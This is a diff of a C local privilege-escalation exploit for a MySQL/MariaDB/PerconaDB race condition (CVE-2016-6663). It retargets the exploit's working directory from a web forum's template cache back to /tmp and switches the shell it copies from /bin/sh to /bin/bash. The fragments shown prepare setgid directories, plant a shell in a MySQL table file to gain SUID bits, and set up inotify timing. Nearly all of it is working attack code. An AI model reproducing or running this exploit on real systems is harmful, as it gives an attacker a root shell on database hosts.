@@ -47,8 +47,7 @@ https://legalhackers.com/videos/MySQL-MariaDB-PerconaDB-PrivEsc-Race-CVE-2016-66
 #include <unistd.h>
 
 
-#define EXP_PATH          "/var/www/forum/templates_c/tmp/"
-#define EXP_PATH2         "/var/www/forum/templates_c/tmp/mysql_privesc_exploit"
+#define EXP_PATH          "/tmp/mysql_privesc_exploit"
 #define EXP_DIRN          "mysql_privesc_exploit"
 #define MYSQL_TAB_FILE    EXP_PATH "/exploit_table.MYD"
 #define MYSQL_TEMP_FILE   EXP_PATH "/exploit_table.TMD"
@@ -147,8 +146,8 @@ int main(int argc,char **argv)
     // Prepare tmp dir
     printf("\n[+] Creating exploit temp directory %s\n", "/tmp/" EXP_DIRN);
     umask(000);
-    system("rm -rf /var/www/forum/templates_c/tmp/" EXP_DIRN " && mkdir /var/www/forum/templates_c/tmp/" EXP_DIRN);
-    system("chmod g+s /var/www/forum/templates_c/tmp/" EXP_DIRN );
+    system("rm -rf /tmp/" EXP_DIRN " && mkdir /tmp/" EXP_DIRN);
+    system("chmod g+s /tmp/" EXP_DIRN );
 
     // Prepare exploit tables :)
     printf("\n[+] Creating mysql tables \n\n");
@@ -160,7 +159,7 @@ int main(int argc,char **argv)
     // Copy /bin/bash into the mysql_suid_shell.MYD mysql table file
     // The file should be owned by mysql:attacker thanks to the sticky bit on the table directory
     printf("\n[+] Copying bash into the mysql_suid_shell table.\n    After the exploitation the following file/table will be assigned SUID and executable bits : \n");
-    system("cp /bin/sh " SUID_SHELL);
+    system("cp /bin/bash " SUID_SHELL);
     system("ls -l " SUID_SHELL);
 
     // Use inotify to get the timing right
